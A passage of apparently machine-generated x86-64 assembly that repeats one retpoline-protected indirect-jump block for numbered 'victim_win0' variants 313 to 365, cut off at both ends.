	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000313
	jmp	.Lgg_retpol_after_000313
.Lgg_retpol_thunk_000313:
	callq	.Lgg_retpol_setup_000313
.Lgg_retpol_cap_000313:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000313
.Lgg_retpol_setup_000313:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000313:
	jmp	.Lvictim_win0_continue
## Variant 314
.Lvictim_win0_var314:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000314
	jmp	.Lgg_retpol_after_000314
.Lgg_retpol_thunk_000314:
	callq	.Lgg_retpol_setup_000314
.Lgg_retpol_cap_000314:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000314
.Lgg_retpol_setup_000314:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000314:
	jmp	.Lvictim_win0_continue
## Variant 315
.Lvictim_win0_var315:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000315
	jmp	.Lgg_retpol_after_000315
.Lgg_retpol_thunk_000315:
	callq	.Lgg_retpol_setup_000315
.Lgg_retpol_cap_000315:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000315
.Lgg_retpol_setup_000315:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000315:
	jmp	.Lvictim_win0_continue
## Variant 316
.Lvictim_win0_var316:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000316
	jmp	.Lgg_retpol_after_000316
.Lgg_retpol_thunk_000316:
	callq	.Lgg_retpol_setup_000316
.Lgg_retpol_cap_000316:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000316
.Lgg_retpol_setup_000316:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000316:
	jmp	.Lvictim_win0_continue
## Variant 317
.Lvictim_win0_var317:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000317
	jmp	.Lgg_retpol_after_000317
.Lgg_retpol_thunk_000317:
	callq	.Lgg_retpol_setup_000317
.Lgg_retpol_cap_000317:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000317
.Lgg_retpol_setup_000317:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000317:
	jmp	.Lvictim_win0_continue
## Variant 318
.Lvictim_win0_var318:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000318
	jmp	.Lgg_retpol_after_000318
.Lgg_retpol_thunk_000318:
	callq	.Lgg_retpol_setup_000318
.Lgg_retpol_cap_000318:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000318
.Lgg_retpol_setup_000318:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000318:
	jmp	.Lvictim_win0_continue
## Variant 319
.Lvictim_win0_var319:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000319
	jmp	.Lgg_retpol_after_000319
.Lgg_retpol_thunk_000319:
	callq	.Lgg_retpol_setup_000319
.Lgg_retpol_cap_000319:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000319
.Lgg_retpol_setup_000319:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000319:
	jmp	.Lvictim_win0_continue
## Variant 320
.Lvictim_win0_var320:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000320
	jmp	.Lgg_retpol_after_000320
.Lgg_retpol_thunk_000320:
	callq	.Lgg_retpol_setup_000320
.Lgg_retpol_cap_000320:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000320
.Lgg_retpol_setup_000320:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000320:
	jmp	.Lvictim_win0_continue
## Variant 321
.Lvictim_win0_var321:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000321
	jmp	.Lgg_retpol_after_000321
.Lgg_retpol_thunk_000321:
	callq	.Lgg_retpol_setup_000321
.Lgg_retpol_cap_000321:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000321
.Lgg_retpol_setup_000321:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000321:
	jmp	.Lvictim_win0_continue
## Variant 322
.Lvictim_win0_var322:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000322
	jmp	.Lgg_retpol_after_000322
.Lgg_retpol_thunk_000322:
	callq	.Lgg_retpol_setup_000322
.Lgg_retpol_cap_000322:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000322
.Lgg_retpol_setup_000322:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000322:
	jmp	.Lvictim_win0_continue
## Variant 323
.Lvictim_win0_var323:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000323
	jmp	.Lgg_retpol_after_000323
.Lgg_retpol_thunk_000323:
	callq	.Lgg_retpol_setup_000323
.Lgg_retpol_cap_000323:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000323
.Lgg_retpol_setup_000323:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000323:
	jmp	.Lvictim_win0_continue
## Variant 324
.Lvictim_win0_var324:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000324
	jmp	.Lgg_retpol_after_000324
.Lgg_retpol_thunk_000324:
	callq	.Lgg_retpol_setup_000324
.Lgg_retpol_cap_000324:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000324
.Lgg_retpol_setup_000324:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000324:
	jmp	.Lvictim_win0_continue
## Variant 325
.Lvictim_win0_var325:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000325
	jmp	.Lgg_retpol_after_000325
.Lgg_retpol_thunk_000325:
	callq	.Lgg_retpol_setup_000325
.Lgg_retpol_cap_000325:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000325
.Lgg_retpol_setup_000325:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000325:
	jmp	.Lvictim_win0_continue
## Variant 326
.Lvictim_win0_var326:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000326
	jmp	.Lgg_retpol_after_000326
.Lgg_retpol_thunk_000326:
	callq	.Lgg_retpol_setup_000326
.Lgg_retpol_cap_000326:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000326
.Lgg_retpol_setup_000326:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000326:
	jmp	.Lvictim_win0_continue
## Variant 327
.Lvictim_win0_var327:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000327
	jmp	.Lgg_retpol_after_000327
.Lgg_retpol_thunk_000327:
	callq	.Lgg_retpol_setup_000327
.Lgg_retpol_cap_000327:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000327
.Lgg_retpol_setup_000327:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000327:
	jmp	.Lvictim_win0_continue
## Variant 328
.Lvictim_win0_var328:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000328
	jmp	.Lgg_retpol_after_000328
.Lgg_retpol_thunk_000328:
	callq	.Lgg_retpol_setup_000328
.Lgg_retpol_cap_000328:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000328
.Lgg_retpol_setup_000328:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000328:
	jmp	.Lvictim_win0_continue
## Variant 329
.Lvictim_win0_var329:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000329
	jmp	.Lgg_retpol_after_000329
.Lgg_retpol_thunk_000329:
	callq	.Lgg_retpol_setup_000329
.Lgg_retpol_cap_000329:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000329
.Lgg_retpol_setup_000329:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000329:
	jmp	.Lvictim_win0_continue
## Variant 330
.Lvictim_win0_var330:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000330
	jmp	.Lgg_retpol_after_000330
.Lgg_retpol_thunk_000330:
	callq	.Lgg_retpol_setup_000330
.Lgg_retpol_cap_000330:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000330
.Lgg_retpol_setup_000330:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000330:
	jmp	.Lvictim_win0_continue
## Variant 331
.Lvictim_win0_var331:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000331
	jmp	.Lgg_retpol_after_000331
.Lgg_retpol_thunk_000331:
	callq	.Lgg_retpol_setup_000331
.Lgg_retpol_cap_000331:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000331
.Lgg_retpol_setup_000331:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000331:
	jmp	.Lvictim_win0_continue
## Variant 332
.Lvictim_win0_var332:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000332
	jmp	.Lgg_retpol_after_000332
.Lgg_retpol_thunk_000332:
	callq	.Lgg_retpol_setup_000332
.Lgg_retpol_cap_000332:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000332
.Lgg_retpol_setup_000332:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000332:
	jmp	.Lvictim_win0_continue
## Variant 333
.Lvictim_win0_var333:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000333
	jmp	.Lgg_retpol_after_000333
.Lgg_retpol_thunk_000333:
	callq	.Lgg_retpol_setup_000333
.Lgg_retpol_cap_000333:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000333
.Lgg_retpol_setup_000333:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000333:
	jmp	.Lvictim_win0_continue
## Variant 334
.Lvictim_win0_var334:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000334
	jmp	.Lgg_retpol_after_000334
.Lgg_retpol_thunk_000334:
	callq	.Lgg_retpol_setup_000334
.Lgg_retpol_cap_000334:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000334
.Lgg_retpol_setup_000334:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000334:
	jmp	.Lvictim_win0_continue
## Variant 335
.Lvictim_win0_var335:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000335
	jmp	.Lgg_retpol_after_000335
.Lgg_retpol_thunk_000335:
	callq	.Lgg_retpol_setup_000335
.Lgg_retpol_cap_000335:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000335
.Lgg_retpol_setup_000335:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000335:
	jmp	.Lvictim_win0_continue
## Variant 336
.Lvictim_win0_var336:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000336
	jmp	.Lgg_retpol_after_000336
.Lgg_retpol_thunk_000336:
	callq	.Lgg_retpol_setup_000336
.Lgg_retpol_cap_000336:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000336
.Lgg_retpol_setup_000336:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000336:
	jmp	.Lvictim_win0_continue
## Variant 337
.Lvictim_win0_var337:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000337
	jmp	.Lgg_retpol_after_000337
.Lgg_retpol_thunk_000337:
	callq	.Lgg_retpol_setup_000337
.Lgg_retpol_cap_000337:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000337
.Lgg_retpol_setup_000337:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000337:
	jmp	.Lvictim_win0_continue
## Variant 338
.Lvictim_win0_var338:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000338
	jmp	.Lgg_retpol_after_000338
.Lgg_retpol_thunk_000338:
	callq	.Lgg_retpol_setup_000338
.Lgg_retpol_cap_000338:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000338
.Lgg_retpol_setup_000338:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000338:
	jmp	.Lvictim_win0_continue
## Variant 339
.Lvictim_win0_var339:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000339
	jmp	.Lgg_retpol_after_000339
.Lgg_retpol_thunk_000339:
	callq	.Lgg_retpol_setup_000339
.Lgg_retpol_cap_000339:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000339
.Lgg_retpol_setup_000339:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000339:
	jmp	.Lvictim_win0_continue
## Variant 340
.Lvictim_win0_var340:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000340
	jmp	.Lgg_retpol_after_000340
.Lgg_retpol_thunk_000340:
	callq	.Lgg_retpol_setup_000340
.Lgg_retpol_cap_000340:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000340
.Lgg_retpol_setup_000340:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000340:
	jmp	.Lvictim_win0_continue
## Variant 341
.Lvictim_win0_var341:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000341
	jmp	.Lgg_retpol_after_000341
.Lgg_retpol_thunk_000341:
	callq	.Lgg_retpol_setup_000341
.Lgg_retpol_cap_000341:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000341
.Lgg_retpol_setup_000341:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000341:
	jmp	.Lvictim_win0_continue
## Variant 342
.Lvictim_win0_var342:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000342
	jmp	.Lgg_retpol_after_000342
.Lgg_retpol_thunk_000342:
	callq	.Lgg_retpol_setup_000342
.Lgg_retpol_cap_000342:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000342
.Lgg_retpol_setup_000342:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000342:
	jmp	.Lvictim_win0_continue
## Variant 343
.Lvictim_win0_var343:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000343
	jmp	.Lgg_retpol_after_000343
.Lgg_retpol_thunk_000343:
	callq	.Lgg_retpol_setup_000343
.Lgg_retpol_cap_000343:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000343
.Lgg_retpol_setup_000343:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000343:
	jmp	.Lvictim_win0_continue
## Variant 344
.Lvictim_win0_var344:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000344
	jmp	.Lgg_retpol_after_000344
.Lgg_retpol_thunk_000344:
	callq	.Lgg_retpol_setup_000344
.Lgg_retpol_cap_000344:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000344
.Lgg_retpol_setup_000344:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000344:
	jmp	.Lvictim_win0_continue
## Variant 345
.Lvictim_win0_var345:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000345
	jmp	.Lgg_retpol_after_000345
.Lgg_retpol_thunk_000345:
	callq	.Lgg_retpol_setup_000345
.Lgg_retpol_cap_000345:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000345
.Lgg_retpol_setup_000345:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000345:
	jmp	.Lvictim_win0_continue
## Variant 346
.Lvictim_win0_var346:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000346
	jmp	.Lgg_retpol_after_000346
.Lgg_retpol_thunk_000346:
	callq	.Lgg_retpol_setup_000346
.Lgg_retpol_cap_000346:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000346
.Lgg_retpol_setup_000346:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000346:
	jmp	.Lvictim_win0_continue
## Variant 347
.Lvictim_win0_var347:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000347
	jmp	.Lgg_retpol_after_000347
.Lgg_retpol_thunk_000347:
	callq	.Lgg_retpol_setup_000347
.Lgg_retpol_cap_000347:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000347
.Lgg_retpol_setup_000347:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000347:
	jmp	.Lvictim_win0_continue
## Variant 348
.Lvictim_win0_var348:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000348
	jmp	.Lgg_retpol_after_000348
.Lgg_retpol_thunk_000348:
	callq	.Lgg_retpol_setup_000348
.Lgg_retpol_cap_000348:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000348
.Lgg_retpol_setup_000348:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000348:
	jmp	.Lvictim_win0_continue
## Variant 349
.Lvictim_win0_var349:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000349
	jmp	.Lgg_retpol_after_000349
.Lgg_retpol_thunk_000349:
	callq	.Lgg_retpol_setup_000349
.Lgg_retpol_cap_000349:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000349
.Lgg_retpol_setup_000349:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000349:
	jmp	.Lvictim_win0_continue
## Variant 350
.Lvictim_win0_var350:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000350
	jmp	.Lgg_retpol_after_000350
.Lgg_retpol_thunk_000350:
	callq	.Lgg_retpol_setup_000350
.Lgg_retpol_cap_000350:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000350
.Lgg_retpol_setup_000350:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000350:
	jmp	.Lvictim_win0_continue
## Variant 351
.Lvictim_win0_var351:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000351
	jmp	.Lgg_retpol_after_000351
.Lgg_retpol_thunk_000351:
	callq	.Lgg_retpol_setup_000351
.Lgg_retpol_cap_000351:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000351
.Lgg_retpol_setup_000351:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000351:
	jmp	.Lvictim_win0_continue
## Variant 352
.Lvictim_win0_var352:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000352
	jmp	.Lgg_retpol_after_000352
.Lgg_retpol_thunk_000352:
	callq	.Lgg_retpol_setup_000352
.Lgg_retpol_cap_000352:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000352
.Lgg_retpol_setup_000352:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000352:
	jmp	.Lvictim_win0_continue
## Variant 353
.Lvictim_win0_var353:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000353
	jmp	.Lgg_retpol_after_000353
.Lgg_retpol_thunk_000353:
	callq	.Lgg_retpol_setup_000353
.Lgg_retpol_cap_000353:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000353
.Lgg_retpol_setup_000353:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000353:
	jmp	.Lvictim_win0_continue
## Variant 354
.Lvictim_win0_var354:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000354
	jmp	.Lgg_retpol_after_000354
.Lgg_retpol_thunk_000354:
	callq	.Lgg_retpol_setup_000354
.Lgg_retpol_cap_000354:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000354
.Lgg_retpol_setup_000354:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000354:
	jmp	.Lvictim_win0_continue
## Variant 355
.Lvictim_win0_var355:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000355
	jmp	.Lgg_retpol_after_000355
.Lgg_retpol_thunk_000355:
	callq	.Lgg_retpol_setup_000355
.Lgg_retpol_cap_000355:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000355
.Lgg_retpol_setup_000355:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000355:
	jmp	.Lvictim_win0_continue
## Variant 356
.Lvictim_win0_var356:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000356
	jmp	.Lgg_retpol_after_000356
.Lgg_retpol_thunk_000356:
	callq	.Lgg_retpol_setup_000356
.Lgg_retpol_cap_000356:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000356
.Lgg_retpol_setup_000356:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000356:
	jmp	.Lvictim_win0_continue
## Variant 357
.Lvictim_win0_var357:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000357
	jmp	.Lgg_retpol_after_000357
.Lgg_retpol_thunk_000357:
	callq	.Lgg_retpol_setup_000357
.Lgg_retpol_cap_000357:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000357
.Lgg_retpol_setup_000357:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000357:
	jmp	.Lvictim_win0_continue
## Variant 358
.Lvictim_win0_var358:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000358
	jmp	.Lgg_retpol_after_000358
.Lgg_retpol_thunk_000358:
	callq	.Lgg_retpol_setup_000358
.Lgg_retpol_cap_000358:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000358
.Lgg_retpol_setup_000358:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000358:
	jmp	.Lvictim_win0_continue
## Variant 359
.Lvictim_win0_var359:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000359
	jmp	.Lgg_retpol_after_000359
.Lgg_retpol_thunk_000359:
	callq	.Lgg_retpol_setup_000359
.Lgg_retpol_cap_000359:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000359
.Lgg_retpol_setup_000359:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000359:
	jmp	.Lvictim_win0_continue
## Variant 360
.Lvictim_win0_var360:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000360
	jmp	.Lgg_retpol_after_000360
.Lgg_retpol_thunk_000360:
	callq	.Lgg_retpol_setup_000360
.Lgg_retpol_cap_000360:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000360
.Lgg_retpol_setup_000360:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000360:
	jmp	.Lvictim_win0_continue
## Variant 361
.Lvictim_win0_var361:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000361
	jmp	.Lgg_retpol_after_000361
.Lgg_retpol_thunk_000361:
	callq	.Lgg_retpol_setup_000361
.Lgg_retpol_cap_000361:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000361
.Lgg_retpol_setup_000361:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000361:
	jmp	.Lvictim_win0_continue
## Variant 362
.Lvictim_win0_var362:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000362
	jmp	.Lgg_retpol_after_000362
.Lgg_retpol_thunk_000362:
	callq	.Lgg_retpol_setup_000362
.Lgg_retpol_cap_000362:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000362
.Lgg_retpol_setup_000362:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000362:
	jmp	.Lvictim_win0_continue
## Variant 363
.Lvictim_win0_var363:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000363
	jmp	.Lgg_retpol_after_000363
.Lgg_retpol_thunk_000363:
	callq	.Lgg_retpol_setup_000363
.Lgg_retpol_cap_000363:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000363
.Lgg_retpol_setup_000363:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000363:
	jmp	.Lvictim_win0_continue
## Variant 364
.Lvictim_win0_var364:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000364
	jmp	.Lgg_retpol_after_000364
.Lgg_retpol_thunk_000364:
	callq	.Lgg_retpol_setup_000364
.Lgg_retpol_cap_000364:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000364
.Lgg_retpol_setup_000364:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000364:
	jmp	.Lvictim_win0_continue
## Variant 365
.Lvictim_win0_var365:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000365
	jmp	.Lgg_retpol_after_000365
